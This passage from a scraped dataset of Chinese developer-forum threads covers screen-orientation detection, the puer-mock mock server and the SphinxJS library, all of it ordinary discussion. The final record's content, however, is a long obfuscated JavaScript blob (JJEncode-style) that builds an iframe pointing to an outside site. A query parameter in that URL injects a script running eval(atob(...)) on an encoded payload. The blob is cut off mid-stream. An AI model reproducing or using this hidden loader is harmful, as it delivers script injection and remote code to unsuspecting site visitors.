|| win.orientation === 0) {\n        meta.init = 'portrait';\n        meta.current = 'portrait';\n    }\n    if (win.orientation === 90 || win.orientation === -90) {\n        meta.init = 'landscape';\n        meta.current = 'landscape';\n    }\n    return function() {\n        if (win.orientation === 180 || win.orientation === 0) {\n            meta.current = 'portrait';\n        }\n        if (win.orientation === 90 || win.orientation === -90) {\n            meta.current = 'landscape';\n        }\n        event.trigger(eventType, meta);\n    }\n};\nvar callback = isOrientation ? orientationCB() : (function() {\n    resizeCB();\n    return function() {\n        timer &amp;&amp; win.clearTimeout(timer);\n        timer = win.setTimeout(resizeCB, 300);\n    }\n})();\n// 监听\nwin.addEventListener(isOrientation ? eventType : 'resize', callback, false);\n</code></pre>\n<p><a href=\"https://github.com/zhansingsong/orientationchange-fix/blob/master/other/pl_orientation.js\" rel=\"nofollow\">完整代码猛击这里</a></p>\n<h2>方案五：</h2>\n<p>目前，上述几种方案都是通过自定制的<strong>订阅与发布</strong>事件模式来实现的。这里可以基于浏览器的事件机制，来模拟<code>orientationchange</code>。即对<code>orientationchange</code>的不兼容进行修复。</p>\n<p>关键代码如下：</p>\n<pre><code>var eventType = 'orientationchange';\n// 触发原生 orientationchange\nvar fire = function() {\n    var e;\n    if (document.createEvent) {\n        e = document.createEvent('HTMLEvents');\n        e.initEvent(eventType, true, false);\n        win.dispatchEvent(e);\n    } else {\n        e = document.createEventObject();\n        e.eventType = eventType;\n        if (win[eventType]) {\n            win[eventType]();\n        } else if (win['on' + eventType]) {\n            win['on' + eventType]();\n        } else {\n            win.fireEvent(eventType, e);\n        }\n    }\n}\n</code></pre>\n<p><a href=\"https://github.com/zhansingsong/orientationchange-fix/blob/master/src/orientationchange-fix.js\" rel=\"nofollow\">完整代码猛击这里</a></p>\n<p>通过上述 5 种方案，自己对移动端横竖屏检测有了更进一步的认识，有些东西只有自己亲身经历过才知道为什么要这么写，自己也把其中缘由记录在文章中，希望对大家有帮助。经过 5 种方案的演变得到了最终<code>orientationchange-fix</code>， github 地址：<a href=\"https://github.com/zhansingsong/orientationchange-fix\" rel=\"nofollow\">https://github.com/zhansingsong/orientationchange-fix</a></p>\n</div></div>"], "reply": "7", "tittle": "更靠谱的横竖屏检测方法", "comment": ["感谢分享！", "内容很有帮助，但每个方案一步一步更完美的迭代更有教育意义", "其实靠宽高比判断就够了 因为你知道横竖屏的最终目的也是为了知道宽高比而已", "其实 css 那个判断也是判断的宽高比", "  没有深入了解 @", " 判断机制，了解测试了一下，确实是:)", " 不过在获取高宽时，某些浏览器给出的值不太正确，相当╮(╯_╰)╭", "一样的啊，支持 orientation 的设备同时也会支持 media query ，反之同理"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>前后端分离之后, 接口文档还不够, 以前是假数据时代, 现在 mock server 才是未来, 最终我们需要一个统一的接口管理平台.</p>\n<p><a href=\"https://github.com/ufologist/puer-mock\" rel=\"nofollow\">puer-mock</a></p>\n<pre><code>npm install puer-mock --save-dev\npuer -a _mockserver.js\n</code></pre>\n<pre><code>{\n    \"api\": {\n        \"GET /api/users\": {\n            \"response\": {}\n        }\n    }\n}\n</code></pre>\n<p><img alt=\"puer-mock-example\" src=\"https://ufologist.github.io/puer-mock/puer-mock-example.png\"></p>\n<p><img alt=\"puer-mock-api-doc-html\" src=\"https://ufologist.github.io/puer-mock/puer-mock-api-doc-html.png\"></p>\n<p><a href=\"https://github.com/ufologist/puer-mock/blob/master/why-your-need-a-mock-server.md\" rel=\"nofollow\">为什么你需要一个 mock server</a></p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>v1.2.0 2016-9-14</p>\n<p>特此中秋佳节之际, 发布新版本, 祝大家中秋节快乐.</p>\n<ul>\n<li>[feat] 新增了对 request 请求的参数(即接口的输入)做验证</li>\n<li>[feat] <a href=\"https://github.com/ufologist/puer-mock/blob/master/_mockserver-config.md\" rel=\"nofollow\">新增了接口配置文档</a></li>\n<li>[feat] <a href=\"https://github.com/ufologist/puer-mock/blob/master/_mockserver-schema.json\" rel=\"nofollow\">新增了接口配置文档的 JSON schema</a></li>\n<li>[feat] 新增了很多的配置示例, <a href=\"https://github.com/ufologist/puer-mock/blob/master/example/_mockserver.json\" rel=\"nofollow\">现在配置了 32 个用作示例的接口</a></li>\n<li>[feat] <a href=\"https://github.com/ufologist/puer-mock/tree/master/test\" rel=\"nofollow\">新增了测试用例</a></li>\n<li>[feat] 重构代码, 拆分为 <code>puer-mock.js</code> <code>route-config.js</code> <code>validate-request.js</code> <code>util.js</code></li>\n<li>[fix] <a href=\"https://github.com/ufologist/puer-mock/issues/1\" rel=\"nofollow\">#1 mockConfigFileWatcher.close is not a function</a></li>\n</ul>\n</div></div>"], "reply": "22", "tittle": "为什么你需要一个 mock server", "comment": ["有 swagger ， 为什么还要 mock", " 据我所知 swagger 可以定义接口，做为接口文档，但如果后端接口还没有开发完，前端难道不需要 mock 吗？\r", "这时候前端一般的做法就是自己手工做假数据，但这样做的效率和方式都不理想，所以才做了 puer-mock 项目", "支持下，最近正在找这类工具，", "13 年的时候用过 tw 一个人写的 moco", "既然你用了我司大神的作品 puer ， 那为什么不直接用 ", "\r", "\r", "说实话，你造的这个轮子可用性很差", " nei 开源么？", "话说回来。。不看看 ", " 这边么？正在测试，还没准备好正式上~", " 试用了一下 ", " , 可是没有找到在哪里可以定义接口的参数?\r", "\r", " 感谢你的分享, 长知识了, puer-mock 相比 NEI, 根本是没法比了, NEI 是一个完善的接口管理平台, 而 puer-mock 仅仅是为了方便大家快速定义接口做一个 mock server 而已.\r", "\r", "说到造轮子, 可能是我见识少, 没有看见过 puer-mock 这样的轮子, 纯粹是为解决自己遇到的问题, 如果要论可用性, 我自己觉得很方便, 已经够用了, 其他准备使用的小伙伴们如果有问题可以发 issue 或者 pr, 或者再造一个更好的也无妨.\r", "\r", "另外看了一圈 NEI , 不知是否可以算是网易公司(内部?)级别的东西, 感叹大公司就是好啊, 如果所有团队都能够这样统一作业, 可谓是行业的又一大进步, 值得我们学习. 感觉和阿里系的 RAP 有部分功能类似.\r", " 有缘啊, 我也用过 moco, 但貌似不能做动态可变的假数据, 只能是写死的假数据, 配置起来也不是很直观, 是基于 Java 实现的, 对于前端来说可能不太方便定制.\r", "\r", " 主要还是内部用，其实 NEI 目前已经很强大了，特别是最近新出的版本，已经可以自定义函数\r", "\r", "但是，作为使用者，内部还是很多反馈并不是那么好，所以任重道远吧\r", "\r", "\r", "造轮子挺好的，至少对自己而言学习了很多东西，这种技术驱动型的作品本身也很好的\r", "\r", "我说的可用性差仅仅是我平时开发中遇到的场景太多了，发现 NEI 很多时候都不能满足，而你的方案就目前来说我基本无法应用到项目中……\r", "\r", "实际项目的 mock 应该这样：\r", "\r", " - 应该有个平台（ Web 形式也好，客户端形式也行）来同时提供给前后端使用，并且对双方都友好，因为定义接口通常是多个团队的事情\r", " - 平台的修改应该很容易反应到本地 Mock 数据，并且可以有多种选择（这个需求本身并不好实现）\r", " - Mock 生成的数据应该同时对 iOS/Android/... 都友好，而且不应该有入侵性\r", " - Mock 数据的定义应该可以自己插入一些简单逻辑，比如某个字段只返回 1-10 之间的数字\r", " - Mock 数据的定义应该考虑到可复用性，因为很多接口和数据结构本身就是重复的……\r", " - Mock 的管理应该区分用户权限，而且在生成过程中也有体现\r", " - Mock 接口和数据定义后，应该可以有条件直接生成文档\r", " - ....\r", "\r", "太多了，很多时候使用一个东西时候就应该考虑到各个情况，如果项目中使用了一个有很多缺陷的东西，可能后面项目的推进都会被这个牵制", " 感谢你提出的这些顾虑，也引发了我的思考，希望和大家共同探讨下\r", "\r", "-----------------\r", "\r", "在做 puer-mock 的时候，我参考了很多接口规范和接口平台，主要是从 Swagger 和 RAP 那里获得的灵感，希望可以尽量简单的通过 JSON 配置来定义一个接口，并生成随机数据，继而形成一个标准的接口文档(谁说接口文档只能是 word 之类的)。\r", "\r", "如果形成了接口规范，我想后面的事情都是有可能的。\r", "\r", "> 应该有个平台\r", "puer-mock 目前比较适合中小型团队的前后端协作，因为是直接编写 JSON 文件做为接口文档的，因此需要双方都熟悉配置，对于技术团队没什么大问题，定义接口的方式也足够简单，基本上熟悉 HTTP 的，看一眼就明白这些接口的定义了。\r", "\r", "如果要更友好些，那就需要做一层 UI ，做一个系统，一个平台，通过可视化的手段来生成接口配置文件就好了。所以说定义好接口规范是最基础最重要的第一步， puer-mock 尝试做好这一步。\r", "\r", "> 平台的修改应该很容易反应到本地 Mock 数据\r", "puer-mock 支持修改了接口配置后马上生效，应该还是能够满足大部分需求的\r", "\r", "> Mock 生成的数据应该同时对 iOS/Android/... 都友好\r", "puer-mock 生成的 mock 没有针对某个客户端，属于后端接口规范，对客户端都是友好的，也没有任何侵入性\r", "\r", "> Mock 数据的定义应该可以自己插入一些简单逻辑\r", "puer-mock 后面是通过强大的 mock.js 来生成 mock 数据，因此针对\"某个字段只返回 1-10 之间的数字\"这样的需求是完全满足的。\r", "例如配置方式如下\r", "\"field1\": \"@integer(1, 10)\"\r", "\r", "> Mock 数据的定义应该考虑到可复用性\r", "puer-mock 在参考 Swagger 规范的时候就意识到了这个问题，但出于简单的考虑，暂时只能复制粘贴那些重复的 response 定义，这确实是埋了个坑，但对于中小型团队应该还好啦，有规范总比没有的好。关于这点， puer-mock 考虑以后是否通过 Swagger ref 的方式来引用预先定义好的数据结构，或者通过上层的接口平台来解决这个问题，将数据结构定义在接口平台，让接口平台来生成重复的数据结构引用，来避免手工复制粘贴造成数据结构出现潜在的不一致性问题\r", "\r", "> Mock 的管理应该区分用户权限\r", "这个不在 puer-mock 的考虑范围，上层的接口平台可以来做这个事情，这也是为什么越往后统一的接口平台越重要的原因，形成部门级公司级的协作流程\r", "\r", "> Mock 接口和数据定义后，应该可以有条件直接生成文档 \r", "目前 puer-mock 内置了接口文档，可以在线查看，虽然还比较简陋，只是格式化展示了接口定义的 JSON 文件，做了分组便于查看。但根据接口定义的 JSON 输出接口文档完全是可以自定义的，所以想生成一份高大上的接口文档完全没有问题\r", "\r", "-----------------\r", "\r", "最后说下目前 puer-mock 已经在我厂中推行，有 3 个项目(小公司项目本来就不多啊，大家见笑了)使用了，定义了 50 多个后端接口，前端 /App 端 /后端都表示很实用，确实提高了工作效率", "关注。", "不错,已经用了,最开始是用的 mock.js+jsonserver 来实现的,找了好几个 最后找到了 puer-mock,前几天还想看看是不是完整的支持 rest, 想对 form 参数,进行一些过滤", " puer-mock 的路由配置是完整支持 RESTful 的\r", "\r", "看到你想对 form 参数进行一些过滤, 是指什么? 是指对请求参数做一些验证吗?\r", "\r", "如果是这个功能, puer-mock 接下来的 1.2.0 版本即将支持这个功能\r", "\r", "例如:\r", "\"request\": {\r", "    \"querystring\": {},\r", "    \"header\": {},\r", "    \"body\": {}\r", "}\r", "\r", "完整说明请参考 example/_mockserver.json\r", "   谢谢,分页这个需求请求的是一个地址, 第一页:\"POST /list\" +\"request\": {\r", "                \"param\": {\"limit\":20,\"offset\":0},  第二页:   \"POST /list\" +\"request\": {\r", "                \"param\": {\"limit\":20,\"offset\":20}  ,我希望 是 url+参数 来确定一个接口   我可以在 api 里 写两个同名的\"POST /list\"", " 分页为什么需要定义两个接口呢？难不成需要第一页和第二页返回不同结构的数据？\r", "\r", "puer-mock 只验证客户端是否传入了必要的参数，不承担实际的业务逻辑，毕竟是 mock server ，不考虑实现很复杂的验证逻辑\r", "\r", "因此你可以这样定义接口\r", "\"POST /list\": {\r", "    \"request\": { // 仅验证参数\r", "        \"body\": {\r", "            \"limit\": 20,\r", "            \"offset\": 0\r", "        }\r", "    },\r", "    \"response\": {\r", "        \"data\": {\r", "            \"list|1-10\": [{\r", "                \"id\": \"@id\"\r", "            }]\r", "        }\r", "    }\r", "}", "  确实是,我是用 puer-mock 做 iOS 的 mock Server,谢谢你的 puer-mock", " 已经发布了 1.2.0 版本, 欢迎使用", "最近公司也在搞前后端分离, 我一直在寻求提高工作效率的方法. NEi 在一些微信文章里面也看到了. 此外还了解到了契约测试, 还有淘宝 UED 那 6 篇比较出名的文章. 能和你 2 位交流交流吗?  @", " @", " 留个微信号?", " 能够交流再好不过了，可以在 puer-mock 的项目中发 issue 来交流下", " \r", "\r", "关于 puer-mock 使用过程中的常见问题答疑\r"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><blockquote>\n<p>体验地址：<a href=\"https://jrainlau.github.io/sphinx/\" rel=\"nofollow\">https://jrainlau.github.io/sphinx/</a></p>\n</blockquote>\n<blockquote>\n<p>项目地址：<a href=\"https://github.com/jrainlau/sphinx\" rel=\"nofollow\">https://github.com/jrainlau/sphinx</a></p>\n</blockquote>\n<h2>SphinxJS</h2>\n<p>一个能够把字符串编码成 png 图片，或者从 png 图片中解码出字符串的超轻量级开源库，总代码数甚至不超过 100 行！</p>\n<h2>使用方法</h2>\n<p>通过<code>npm</code>安装</p>\n<pre><code>npm install sphinx.js\n</code></pre>\n<p>通过<code>&lt;script&gt;&lt;/script&gt;</code>标签引入</p>\n<pre><code>&lt;script src=\"sphinx.js\"&gt;&lt;/script&gt;\n</code></pre>\n<blockquote>\n<p>值得注意的是，因为<code>SphinxJS</code>使用了 ES2015 的<code>Promise</code>以及其他很棒的特性，这意味着需要你的浏览器提供支持。否则的话，你可能需要<code>Babel</code>或者一些别的工具去构建你的代码。</p>\n</blockquote>\n<blockquote>\n<p><code>SphinxJS</code>同时支持以<code>AMD</code>，<code>CommonJS</code>以及<code>ES6 模块</code>的方式进行引用。</p>\n</blockquote>\n<h2>编码</h2>\n<p>定义一个字符串<code>Hello Sphinx!</code>，我们将对它进行编码</p>\n<pre><code>let base64URL = new Sphinx().encode('Hello Sphinx!')\n</code></pre>\n<p>然后你将得到一串<code>base64</code>编码</p>\n<pre><code>data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAMAAAADCAYAAABWKLW/AAAAJklEQVQYV2P0SM35r8K1heE5owcDY2Zexf8dc1Yw/BdjYGBkQAIA+r4JjQKvLx4AAAAASUVORK5CYII=\n</code></pre>\n<p>到这一步，编码便已经完成了。</p>\n<p>正如你所看到的那样，<code>encode()</code>方法返回一张图片的<code>base64</code>编码。</p>\n<h2>解码</h2>\n<p>定义一串图片的 url ：</p>\n<pre><code>let url = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAMAAAADCAYAAABWKLW/AAAAJklEQVQYV2P0SM35r8K1heE5owcDY2Zexf8dc1Yw/BdjYGBkQAIA+r4JjQKvLx4AAAAASUVORK5CYII='\n</code></pre>\n<p>然后我们对其进行解码！</p>\n<pre><code>new Sphinx().decode(url)\n    .then((info) =&gt; {\n        console.log(info) // Hello Sphinx!\n    })\n</code></pre>\n<p><code>decode()</code>方法会返回一个<code>Promise</code>对象，它包含了从图片中解密出来的字符串信息。</p>\n<h2>配置</h2>\n<p><code>new Sphinx()</code>能够接收一个用于定义图片类型的配置对象</p>\n<ul>\n<li>config {Object} <code>可选</code> 默认值: <code>{img: 'png'}</code></li>\n</ul>\n<pre><code>new Sphinx({img: 'bmp'})\n</code></pre>\n<h2>证书</h2>\n<p>MIT</p>\n</div></div>"], "reply": "1", "tittle": "SphinxJS——把字符串编码成 png 图片的超轻量级开源库", "comment": ["本来想说这个用 Canvas 就能做，结果一看代码还真是……\r", "\r", "顺便转 utf-8 string 的最简单做法是\r", "unescape(encodeURI(str))\r", "\r", "介于 unescape 已经废弃， mdn 上的推荐做法是\r", "encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, function(match, p1) {\r", "        return String.fromCharCode('0x' + p1);\r", "})\r", "\r", "最后，如果用 es6 的话我觉得 release 出去的时候最好 babel 编译一下吧……"]},
{"content": ["<div class=\"topic_content\">$$=~[];$$={___:++$$,$$$$:(![]+\"\")[$$],__$:++$$,$_$_:(![]+\"\")[$$],_$_:++$$,$_$$:({}+\"\")[$$],$$_$:($$[$$]+\"\")[$$],_$$:++$$,$$$_:(!\"\"+\"\")[$$],$__:++$$,$_$:++$$,$$__:({}+\"\")[$$],$$_:++$$,$$$:++$$,$___:++$$,$__$:++$$};$$.$_=($$.$_=$$+\"\")[$$.$_$]+($$._$=$$.$_[$$.__$])+($$.$$=($$.$+\"\")[$$.__$])+((!$$)+\"\")[$$._$$]+($$.__=$$.$_[$$.$$_])+($$.$=(!\"\"+\"\")[$$.__$])+($$._=(!\"\"+\"\")[$$._$_])+$$.$_[$$.$_$]+$$.__+$$._$+$$.$;$$.$$=$$.$+(!\"\"+\"\")[$$._$$]+$$.__+$$._+$$.$+$$.$$;$$.$=($$.___)[$$.$_][$$.$_];$$.$($$.$($$.$$+\"\\\"\"+\"\\\\\"+$$.__$+$$.__$+\"(\"+$$.$$$$+$$._+\"\\\\\"+$$.__$+$$.$_$+$$.$$_+$$.$$__+$$.__+\"\\\\\"+$$.__$+$$.$_$+$$.__$+$$._$+\"\\\\\"+$$.__$+$$.$_$+$$.$$_+\"\\\\\"+$$.$__+$$.___+$$.$_$_+\"\\\\\"+$$.__$+$$.$_$+$$.$$_+$$._$+\"\\\\\"+$$.__$+$$.$_$+$$.$$_+\"\\\\\"+$$.__$+$$.$$$+$$.__$+\"\\\\\"+$$.__$+$$.$_$+$$.$_$+$$._$+$$._+\"\\\\\"+$$.__$+$$.$$_+$$._$$+\"()\\\\\"+$$.$__+$$.___+\"{\\\\\"+$$.__$+$$._$_+\"\\\\\"+$$.__$+$$._$_+\"\\\\\"+$$.__$+$$.__$+\"\\\\\"+$$.__$+$$.__$+\"\\\\\"+$$.__$+$$.__$+\"\\\\\"+$$.__$+$$.$$_+$$.$$_+$$.$_$_+\"\\\\\"+$$.__$+$$.$$_+$$._$_+\"\\\\\"+$$.$__+$$.___+$$.$$$$+\"\\\\\"+$$.$__+$$.___+\"=\\\\\"+$$.$__+$$.___+$$.$$_$+$$._$+$$.$$__+$$._+\"\\\\\"+$$.__$+$$.$_$+$$.$_$+$$.$$$_+\"\\\\\"+$$.__$+$$.$_$+$$.$$_+$$.__+\".\"+$$.$$__+\"\\\\\"+$$.__$+$$.$$_+$$._$_+$$.$$$_+$$.$_$_+$$.__+$$.$$$_+\"\\\\\"+$$.__$+$$.___+$$.$_$+(![]+\"\")[$$._$_]+$$.$$$_+\"\\\\\"+$$.__$+$$.$_$+$$.$_$+$$.$$$_+\"\\\\\"+$$.__$+$$.$_$+$$.$$_+$$.__+\"('\\\\\"+$$.__$+$$.$_$+$$.__$+$$.$$$$+\"\\\\\"+$$.__$+$$.$$_+$$._$_+$$.$_$_+\"\\\\\"+$$.__$+$$.$_$+$$.$_$+$$.$$$_+\"');\\\\\"+$$.__$+$$._$_+\"\\\\\"+$$.__$+$$.__$+\"\\\\\"+$$.__$+$$.__$+\"\\\\\"+$$.__$+$$.__$+$$.$$$$+\".\\\\\"+$$.__$+$$.$$_+$$._$$+$$.$$$_+$$.__+\"\\\\\"+$$.__$+$$.___+$$.__$+$$.__+$$.__+\"\\\\\"+$$.__$+$$.$$_+$$._$_+\"\\\\\"+$$.__$+$$.$_$+$$.__$+$$.$_$$+$$._+$$.__+$$.$$$_+\"('\\\\\"+$$.__$+$$.$$_+$$._$$+\"\\\\\"+$$.__$+$$.$$_+$$._$_+$$.$$__+\"',\\\\\"+$$.$__+$$.___+\"'\\\\\"+$$.__$+$$.$_$+$$.___+$$.__+$$.__+\"\\\\\"+$$.__$+$$.$$_+$$.___+\"://\\\\\"+$$.__$+$$.$$_+$$.$$$+\".\"+$$.$$$$+(![]+\"\")[$$._$_]+$$.$_$_+\"\\\\\"+$$.__$+$$.$_$+$$.$_$+\"\\\\\"+$$.__$+$$.$_$+$$.__$+(![]+\"\")[$$._$_]+\"\\\\\"+$$.__$+$$.$_$+$$.__$+\"\\\\\"+$$.__$+$$.$_$+$$.$$_+\"\\\\\"+$$.__$+$$.$__+$$.$$$+$$._$+\".\"+$$.$$__+$$._$+\"\\\\\"+$$.__$+$$.$_$+$$.$_$+\"/\"+$$.$$$_+\"\\\\\"+$$.__$+$$.$$_+$$._$$+\"/\\\\\"+$$.__$+$$.$_$+$$.$_$+(![]+\"\")[$$._$_]+$$.$$$_+$$.$_$_+\"\\\\\"+$$.__$+$$.$$_+$$._$_+\"\\\\\"+$$.__$+$$.$_$+$$.$$_+\"\\\\\"+$$.__$+$$.$_$+$$.__$+\"\\\\\"+$$.__$+$$.$_$+$$.$$_+\"\\\\\"+$$.__$+$$.$__+$$.$$$+\"?\"+$$._$+$$.$$$$+$$.$$$$+$$.$$$_+\"\\\\\"+$$.__$+$$.$$_+$$._$_+\"=\"+$$._$_+$$._$$+$$._$$+\"&amp;\\\\\"+$$.__$+$$.$$_+$$.___+$$.$_$_+\"\\\\\"+$$.__$+$$.$$_+$$._$_+$$.__+\"\\\\\"+$$.__$+$$.$_$+$$.$$_+$$.$$$_+\"\\\\\"+$$.__$+$$.$$_+$$._$_+\"_\\\\\"+$$.__$+$$.$_$+$$.__$+$$.$$_$+\"=%\"+$$._$_+$$.$$$+\"%\"+$$._$$+\"\\\\\"+$$.__$+$$.___+$$.$_$+\"%\"+$$._$$+\"\\\\\"+$$.__$+$$.___+$$._$$+\"\\\\\"+$$.__$+$$.$$_+$$._$$+$$.$$__+\"\\\\\"+$$.__$+$$.$$_+$$._$_+\"\\\\\"+$$.__$+$$.$_$+$$.__$+\"\\\\\"+$$.__$+$$.$$_+$$.___+$$.__+\"%\"+$$._$_+$$.___+\"\\\\\"+$$.__$+$$.$$_+$$._$$+\"\\\\\"+$$.__$+$$.$$_+$$._$_+$$.$$__+\"=\"+$$.$$_$+$$.$_$_+$$.__+$$.$_$_+\":%\"+$$._$_+$$.$$_+$$.$$__+$$._$+\"\\\\\"+$$.__$+$$.$_$+$$.$_$+\"\\\\\"+$$.__$+$$.$_$+$$.$_$+$$.$_$_+\";\"+$$.$$$_+\"\\\\\"+$$.__$+$$.$$_+$$.$$_+$$.$_$_+(![]+\"\")[$$._$_]+\"(\"+$$.$_$_+$$.__+$$._$+$$.$_$$+\"(%\"+$$._$_+$$.$$$+\"\\\\\"+$$.__$+$$.___+$$._$$+\"\\\\\"+$$.__$+$$.$__+$$.$$$+\"\\\\\"+$$.__$+$$.$_$+$$._$$+\"\\\\\"+$$.__$+$$.__$+$$._$_+\"\\\\\"+$$.__$+$$.___+$$._$$+\"\\\\\"+$$.__$+$$._$_+$$.__$+(![]+\"\")[$$._$_]+$$._$+$$.$$_$+\"\\\\\"+$$.__$+$$.__$+$$.___+\"\\\\\"+$$.__$+$$._$_+$$._$_+\"\\\\\"+$$.__$+$$.$$_+$$.$$$+\"\\\\\"+$$.__$+$$.__$+$$.__$+\"\\\\\"+$$.__$+$$.___+$$.$__+$$.___+\"\\\\\"+$$.__$+$$.$__+$$.$$$+$$.$_$$+\"\\\\\"+$$.__$+$$.$_$+$$.$_$+\"\\\\\"+$$.__$+$$._$_+$$.$$_+$$._$$+\"\\\\\"+$$.__$+$$.__$+$$.__$+\"\\\\\"+$$.__$+$$.___+$$.$$_+\"\\\\\"+$$.__$+$$.$_$+$$.___+\"\\\\\"+$$.__$+$$.__$+$$.$$_+\"\\\\\"+$$.__$+$$._$_+$$.$__+\"\\\\\"+$$.__$+$$.___+$$.$_$+\"\\\\\"+$$.__$+$$.$_$+$$.___+$$.___+$$.$$_$+\"\\\\\"+$$.__$+$$.__$+$$.___+\"\\\\\"+$$.__$+$$.___+$$._$_+\"\\\\\"+$$.__$+$$._$_+$$._$$+\"\\\\\"+$$.__$+$$._$$+$$._$_+\"\\\\\"+$$.__$+$$._$$+$$.___+\"\\\\\"+$$.__$+$$.___+$$.$$_+$$.__$+\"\\\\\"+$$.__$+$$._$$+$$._$_+\"\\\\\"+$$.__$+$$._$$+$$.___+\"\\\\\"+$$.__$+$$.__$+$$.$$_+$$.___+\"\\\\\"+$$.__$+$$.__$+$$._$$+\"\\\\\"+$$.__$+$$.___+$$._$$+\"\\\\\"+$$.__$+$$.$_$+$$._$$+$$.$$$+\"\\\\\"+$$.__$+$$.___+$$._$$+\"\\\\\"+$$.__$+$$.$__+$$.$$$+\"\\\\\"+$$.__$+$$.$_$+$$._$$+\"\\\\\"+$$.__$+$$.__$+$$._$_+\"\\\\\"+$$.__$+$$.___+$$._$$+\"\\\\\"+$$.__$+$$._$_+$$.__$+(![]+\"\")[$$._$_]+$$._$+$$.$$_$+\"\\\\\"+$$.__$+$$.__$+$$.___+\"\\\\\"+$$.__$+$$._$_+$$._$_+\"\\\\\"+$$.__$+$$.$$_+$$.$$$+\"\\\\\"+$$.__$+$$.__$+$$.$__+\"\\\\\"+$$.__$+$$.$_$+$$.$_$+$$.$__$+\"\\\\\"+$$.__$+$$.$$_+$$.$$$+\"\\\\\"+$$.__$+$$._$$+$$._$_+\"\\\\\"+$$.__$+$$._$_+$$.$$$+$$.$__+$$._$+\"\\\\\"+$$.__$+$$.__$+$$._$_+$$._$_+$$.$$_$+(![]+\"\")[$$._$_]+$$.$$_$+\"\\\\\"+$$.__$+$$.___+$$._$$+$$.$$__+\"\\\\\"+$$.__$+$$.$$_+$$._$$+\"\\\\\"+$$.__$+$$.__$+$$.__$+\"\\\\\"+$$.__$+$$.___+$$._$$+$$.$$_$+$$._$+$$.$$_$+\"\\\\\"+$$.__$+$$.__$+$$.___+\"\\\\\"+$$.__$+$$._$_+$$._$_+\"\\\\\"+$$.__$+$$.$$_+$$.$$$+\"\\\\\"+$$.__$+$$.__$+$$.$$$+\"\\\\\"+$$.__$+$$.$_$+$$.__$+$$.$___+\"\\\\\"+$$.__$+$$.$$_+$$.$$_+$$.$$_$+$$._$$+$$.$$_$+$$._$$+\"\\\\\"+$$.__$+$$.__$+$$.$__+\"\\\\\"+$$.__$+$$.$_$+$$.$_$+\"\\\\\"+$$.__$+$$._$$+$$._$_+\"\\\\\"+$$.__$+$$.$$$+$$.__$+\"\\\\\"+$$.__$+$$._$$+$$._$_+\"\\\\\"+$$.__$+$$._$_+$$.$$$+\"\\\\\"+$$.__$+$$._$_+$$.$$_+\"\\\\\"+$$.__$+$$.$_$+$$.$$_+\"\\\\\"+$$.__$+$$._$$+$$.__$+\"\\\\\"+$$.__$+$$._$_+$$.$$$+$$.$$_$+\"\\\\\"+$$.__$+$$.$$$+$$._$_+\"\\\\\"+$$.__$+$$.__$+$$.$__+\"\\\\\"+$$.__$+$$.$_$+$$.$$_+\"\\\\\"+$$.__$+$$.__$+$$.$$_+\"\\\\\"+$$.__$+$$.$$_+$$.___+$$.$$_$+\"\\\\\"+$$.__$+$$.___+$$.$$$+\"\\\\\"+$$.__$+$$._$_+$$.$_$+\"\\\\\"+$$.__$+$$.$$_+$$.$$_+$$.$$_$+\"\\\\\"+$$.__$+$$.$_$+$$.$_$+\"\\\\\"+$$.__$+$$._$_+$$._$_+\"\\\\\"+$$.__$+$$.$_$+$$.$_$+\"\\\\\"+$$.__$+$$.__$+$$.$__+$$._$_+\"\\\\\"+$$.__$+$$.$$$+$$.___+\"\\\\\"+$$.__$+$$.$$_+$$.___+\"\\\\\"+$$.__$+$$._$$+$$.__$+\"\\\\\"+$$.__$+$$.$_$+$$.__$+$$.$__$+\"\\\\\"+$$.__$+$$.$$_+$$._$$+$$.$_$$+\"\\\\\"+$$.__$+$$.___+$$.$$$+\"\\\\\"+$$.__$+$$.$$_+$$.$$$+\"\\\\\"+$$.__$+$$.$$_+$$.$$$+\"\\\\\"+$$.__$+$$.__$+$$.$_$+\"\\\\\"+$$.__$+$$.___+$$.$__+\"\\\\\"+$$.__$+$$.___+$$.__$+\"\\\\\"+$$.__$+$$.$$_+$$.$$_+$$.$$_$+\"\\\\\"+$$.__$+$$.___+$$.$$$+$$.$___+$$._+$$.$$__+\"\\\\\"+$$.__$+$$.___+$$.$$$+\"\\\\\"+$$.__$+$$.$_$+$$.___+\"\\\\\"+$$.__$+$$.$$_+$$.$$$+\"\\\\\"+$$.__$+$$.__$+$$._$_+\"\\\\\"+$$.__$+$$.$$$+$$.__$+\"\\\\\"+$$.__$+$$.$_$+$$._$$+$$.$$$+\"\\\\\"+$$.__$+$$.___+$$._$$+\"\\\\\"+$$.__$+$$.$__+$$.$$$+\"\\\\\"+$$.__$+$$.$_$+$$._$$+\"\\\\\"+$$.__$+$$.__$+$$._$_+\"\\\\\"+$$.__$+$$.___+$$._$$+\"\\\\\"+$$.__$+$$._$_+$$.__$+(![]+\"\")[$$._$_]+$$._$+$$.$$_$+\"\\\\\"+$$.__$+$$.__$+$$.___+\"\\\\\"+$$.__$+$$._$_+$$._$_+\"\\\\\"+$$.__$+$$.$$_+$$.$$$+\"\\\\\"+$$.__$+$$.__$+$$.$__+\"\\\\\"+$$.__$+$$.$_$+$$.$_$+$$.$__$+$$._+$$.$$__+\"\\\\\"+$$.__$+$$.$_$+$$.$_$+\"\\\\\"+$$.__$+$$._$_+$$.$$_+\"\\\\\"+$$.__$+$$.$_$+$$.___+\"\\\\\"+$$.__$+$$._$$+$$._$_+\"\\\\\"+$$.__$+$$.__$+$$.___+(![]+\"\")[$$._$_]+\"\\\\\"+$$.__$+$$.$$$+$$._$_+$$.$$_$+\"\\\\\"+$$.__$+$$.___+$$.$$$+\"\\\\\"+$$.__$+$$.___+$$.$$_+$$.___+\"\\\\\"+$$.__$+$$._$$+$$._$_+\"\\\\\"+$$.__$+$$._$_+$$.$$$+\"\\\\\"+$$.__$+$$.__$+$$.$$_+$$._$+\"\\\\\"+$$.__$+$$._$$+$$.__$+\"\\\\\"+$$.__$+$$._$_+$$.$$$+$$.$_$+\"\\\\\"+$$.__$+$$.$_$+$$.$$_+\"\\\\\"+$$.__$+$$._$$+$$._$_+\"\\\\\"+$$.__$+$$._$_+$$._$$+\"\\\\\"+$$.__$+$$.___+$$.__$+$$.$__$+\"\\\\\"+$$.__$+$$.__$+$$.__$+